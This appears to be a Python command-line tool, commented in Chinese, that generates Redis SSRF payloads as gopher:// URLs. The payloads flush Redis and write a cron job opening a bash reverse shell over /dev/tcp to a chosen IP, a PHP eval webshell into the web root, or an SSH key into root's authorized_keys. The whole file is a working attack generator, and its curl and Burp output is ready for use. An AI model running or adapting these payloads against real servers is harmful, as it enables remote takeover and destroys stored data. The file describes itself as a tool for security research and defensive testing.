#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import urllib.parse
import re
import ipaddress
from typing import Dict, List, Optional
import json
import os


class RedisSSRFGenerator:
    """Redis SSRF payload生成器 - 用于安全研究和防御测试"""
    
    def __init__(self, config_file: Optional[str] = None):
        """初始化配置"""
        self.config = self._load_config(config_file)
        self._validate_config()
        
    def _load_config(self, config_file: Optional[str] = None) -> Dict:
        """加载配置文件或使用默认配置"""
        default_config = {
            "redis": {
                "protocol": "gopher://",
                "ip": "127.0.0.1",
                "port": "6379",
                "password": ""
            },
            "cron": {
                "reverse_ip": "127.0.0.1",
                "reverse_port": "4444",
                "filename": "root",
                "path": "/var/spool/cron"
            },
            "webshell": {
                "shell_content": "<?php eval($_GET[1]);?>",
                "filename": "shell.php",
                "path": "/var/www/html"
            },
            "ssh": {
                "public_key": "ssh-rsa AAAAB3NzaC1yc2E...",
                "filename": "authorized_keys",
                "path": "/root/.ssh/"
            }
        }
        
        if config_file and os.path.exists(config_file):
            try:
                with open(config_file, 'r', encoding='utf-8') as f:
                    user_config = json.load(f)
                    # 合并用户配置
                    for key, value in user_config.items():
                        if key in default_config and isinstance(value, dict):
                            default_config[key].update(value)
                        else:
                            default_config[key] = value
            except (json.JSONDecodeError, IOError) as e:
                print(f"警告: 配置文件加载失败，使用默认配置。错误: {e}")
        
        return default_config
    
    def _validate_config(self):
        """验证配置的完整性和有效性"""
        required_fields = {
            "redis": ["protocol", "ip", "port"],
            "cron": ["reverse_ip", "reverse_port", "filename", "path"],
            "webshell": ["shell_content", "filename", "path"],
            "ssh": ["public_key", "filename", "path"]
        }
        
        for section, fields in required_fields.items():
            if section not in self.config:
                raise ValueError(f"缺少配置节: {section}")
            for field in fields:
                if field not in self.config[section]:
                    raise ValueError(f"缺少配置项: {section}.{field}")
        
        # 验证IP地址格式
        self._validate_ip(self.config['redis']['ip'], 'Redis IP')
        self._validate_ip(self.config['cron']['reverse_ip'], '反弹IP')
        
        # 验证端口号
        self._validate_port(self.config['redis']['port'], 'Redis端口')
        self._validate_port(self.config['cron']['reverse_port'], '反弹端口')
    
    def _validate_ip(self, ip: str, field_name: str):
        """验证IP地址格式"""
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            raise ValueError(f"{field_name}格式错误: {ip}")
    
    def _validate_port(self, port: str, field_name: str):
        """验证端口号范围"""
        try:
            port_num = int(port)
            if not 1 <= port_num <= 65535:
                raise ValueError(f"{field_name}必须在1-65535范围内: {port}")
        except ValueError:
            raise ValueError(f"{field_name}必须是数字: {port}")
    
    def _generate_payload_by_type(self, attack_type: str) -> str:
        """统一的payload生成方法"""
        config_map = {
            'cron': {
                'content': f"\n\n\n\n*/1 * * * * bash -i >& /dev/tcp/{self.config['cron']['reverse_ip']}/{self.config['cron']['reverse_port']} 0>&1\n\n\n\n",
                'key': '1',
                'path': self.config['cron']['path'],
                'filename': self.config['cron']['filename']
            },
            'web': {
                'content': self.config['webshell']['shell_content'],
                'key': 'x',
                'path': self.config['webshell']['path'],
                'filename': self.config['webshell']['filename']
            },
            'ssh': {
                'content': self.config['ssh']['public_key'],
                'key': '1',
                'path': self.config['ssh']['path'],
                'filename': self.config['ssh']['filename']
            }
        }
        
        if attack_type not in config_map:
            raise ValueError(f"不支持的攻击类型: {attack_type}")
        
        cfg = config_map[attack_type]
        commands = [
            "flushall",
            f"set {cfg['key']} {cfg['content'].replace(' ', '${IFS}')}",
            f"config set dir {cfg['path']}",
            f"config set dbfilename {cfg['filename']}",
            "save"
        ]
        
        return self._build_payload(commands)
    
    def _generate_cron_payload(self) -> str:
        """生成定时任务反弹shell的payload"""
        return self._generate_payload_by_type('cron')
    
    def _generate_webshell_payload(self) -> str:
        """生成webshell的payload"""
        return self._generate_payload_by_type('web')
    
    def _generate_ssh_payload(self) -> str:
        """生成SSH公钥的payload"""
        return self._generate_payload_by_type('ssh')
    
    def _build_payload(self, commands: List[str]) -> str:
        """构建完整的payload"""
        base_url = f"{self.config['redis']['protocol']}{self.config['redis']['ip']}:{self.config['redis']['port']}/_"
        payload = base_url
        
        # 如果有密码，添加认证命令
        if self.config['redis']['password']:
            auth_cmd = f"AUTH {self.config['redis']['password']}"
            payload += urllib.parse.quote(self._redis_format(auth_cmd))
        
        # 添加其他命令
        for cmd in commands:
            payload += urllib.parse.quote(self._redis_format(cmd))
        
        return payload
    
    def _redis_format(self, command: str) -> str:
        """格式化Redis命令为RESP协议格式"""
        CRLF = "\r\n"
        redis_arr = command.split(" ")
        cmd = f"*{len(redis_arr)}"
        
        for x in redis_arr:
            cmd += f"{CRLF}${len(x.replace('${IFS}', ' '))}{CRLF}{x.replace('${IFS}', ' ')}"
        
        cmd += CRLF
        return cmd
    
    def generate_payload(self, attack_type: str) -> Dict[str, str]:
        """生成指定类型的payload"""
        attack_type = attack_type.lower()
        payload_generators = {
            'cron': self._generate_cron_payload,
            'web': self._generate_webshell_payload,
            'ssh': self._generate_ssh_payload
        }
        
        if attack_type not in payload_generators:
            raise ValueError(f"不支持的攻击类型: {attack_type}. 支持的类型: {list(payload_generators.keys())}")
        
        raw_payload = payload_generators[attack_type]()
        
        return {
            'curl_payload': raw_payload,
            'burp_payload': urllib.parse.quote(raw_payload)
        }
    
    def save_config(self, config_file: str):
        """保存当前配置到文件"""
        try:
            with open(config_file, 'w', encoding='utf-8') as f:
                json.dump(self.config, f, indent=2, ensure_ascii=False)
            print(f"配置已保存到: {config_file}")
        except IOError as e:
            print(f"保存配置失败: {e}")
    
    def edit_config_interactive(self):
        """交互式编辑配置"""
        print("\n" + "="*40)
        print("交互式配置编辑")
        print("="*40)
        
        # Redis配置
        print("\n[Redis 配置]")
        self.config['redis']['protocol'] = input(f"协议 (当前: {self.config['redis']['protocol']}): ").strip() or self.config['redis']['protocol']
        self.config['redis']['ip'] = input(f"Redis IP (当前: {self.config['redis']['ip']}): ").strip() or self.config['redis']['ip']
        self.config['redis']['port'] = input(f"Redis端口 (当前: {self.config['redis']['port']}): ").strip() or self.config['redis']['port']
        self.config['redis']['password'] = input(f"Redis密码 (当前: {self.config['redis']['password'] or '无'}): ").strip()
        
        # Cron配置
        print("\n[定时任务配置]")
        self.config['cron']['reverse_ip'] = input(f"反弹IP (当前: {self.config['cron']['reverse_ip']}): ").strip() or self.config['cron']['reverse_ip']
        self.config['cron']['reverse_port'] = input(f"反弹端口 (当前: {self.config['cron']['reverse_port']}): ").strip() or self.config['cron']['reverse_port']
        self.config['cron']['filename'] = input(f"cron文件名 (当前: {self.config['cron']['filename']}): ").strip() or self.config['cron']['filename']
        self.config['cron']['path'] = input(f"cron路径 (当前: {self.config['cron']['path']}): ").strip() or self.config['cron']['path']
        
        # Webshell配置
        print("\n[Webshell配置]")
        self.config['webshell']['shell_content'] = input(f"Shell内容 (当前: {self.config['webshell']['shell_content']}): ").strip() or self.config['webshell']['shell_content']
        self.config['webshell']['filename'] = input(f"Shell文件名 (当前: {self.config['webshell']['filename']}): ").strip() or self.config['webshell']['filename']
        self.config['webshell']['path'] = input(f"Web路径 (当前: {self.config['webshell']['path']}): ").strip() or self.config['webshell']['path']
        
        # SSH配置
        print("\n[SSH配置]")
        current_key = self.config['ssh']['public_key']
        display_key = current_key[:50] + "..." if len(current_key) > 50 else current_key
        self.config['ssh']['public_key'] = input(f"SSH公钥 (当前: {display_key}): ").strip() or self.config['ssh']['public_key']
        self.config['ssh']['filename'] = input(f"SSH文件名 (当前: {self.config['ssh']['filename']}): ").strip() or self.config['ssh']['filename']
        self.config['ssh']['path'] = input(f"SSH路径 (当前: {self.config['ssh']['path']}): ").strip() or self.config['ssh']['path']
        
        print("\n配置更新完成!")
    
    def show_current_config(self):
        """显示当前配置"""
        print("\n" + "="*50)
        print("当前配置")
        print("="*50)
        print(f"Redis: {self.config['redis']['protocol']}{self.config['redis']['ip']}:{self.config['redis']['port']}")
        print(f"密码: {'已设置' if self.config['redis']['password'] else '无'}")
        print(f"反弹IP: {self.config['cron']['reverse_ip']}:{self.config['cron']['reverse_port']}")
        print(f"Web路径: {self.config['webshell']['path']}/{self.config['webshell']['filename']}")
        print(f"SSH路径: {self.config['ssh']['path']}{self.config['ssh']['filename']}")
        print("="*50)


def print_menu():
    """打印菜单"""
    print("\n" + "="*50)
    print("Redis SSRF Payload 生成器")
    print("="*50)
    print("1. 定时任务反弹shell (cron)")
    print("2. 网站绝对路径写webshell (web)")
    print("3. Redis写入SSH公钥 (ssh)")
    print("4. 查看当前配置")
    print("5. 编辑并保存配置")
    print("6. 加载配置文件")
    print("7. 退出")
    print("="*50)


def main():
    """主函数"""
    try:
        generator = RedisSSRFGenerator()
        
        while True:
            print_menu()
            choice = input("请选择操作 (1-7): ").strip()
            
            if choice == '1':
                try:
                    payloads = generator.generate_payload('cron')
                    print("\n[+] 定时任务反弹shell Payload:")
                    print(f"curl格式: {payloads['curl_payload']}")
                    print(f"burp格式: {payloads['burp_payload']}")
                except Exception as e:
                    print(f"生成payload失败: {e}")
                    
            elif choice == '2':
                try:
                    payloads = generator.generate_payload('web')
                    print("\n[+] Webshell Payload:")
                    print(f"curl格式: {payloads['curl_payload']}")
                    print(f"burp格式: {payloads['burp_payload']}")
                except Exception as e:
                    print(f"生成payload失败: {e}")
                    
            elif choice == '3':
                try:
                    payloads = generator.generate_payload('ssh')
                    print("\n[+] SSH公钥 Payload:")
                    print(f"curl格式: {payloads['curl_payload']}")
                    print(f"burp格式: {payloads['burp_payload']}")
                except Exception as e:
                    print(f"生成payload失败: {e}")
                    
            elif choice == '4':
                generator.show_current_config()
                    
            elif choice == '5':
                # 编辑并保存配置
                generator.edit_config_interactive()
                config_file = input("请输入要保存的配置文件路径 (默认: config.json): ").strip()
                if not config_file:
                    config_file = "config.json"
                generator.save_config(config_file)
                
            elif choice == '6':
                # 加载配置文件
                config_file = input("请输入要加载的配置文件路径: ").strip()
                if config_file and os.path.exists(config_file):
                    try:
                        generator = RedisSSRFGenerator(config_file)
                        print(f"配置文件 {config_file} 加载成功!")
                    except Exception as e:
                        print(f"加载配置文件失败: {e}")
                else:
                    print("配置文件不存在!")
                
            elif choice == '7':
                print("再见!")
                break
                
            else:
                print("无效的选择，请重新输入!")
                
    except KeyboardInterrupt:
        print("\n程序被用户中断")
    except Exception as e:
        print(f"程序运行错误: {e}")


if __name__ == "__main__":
    main()    
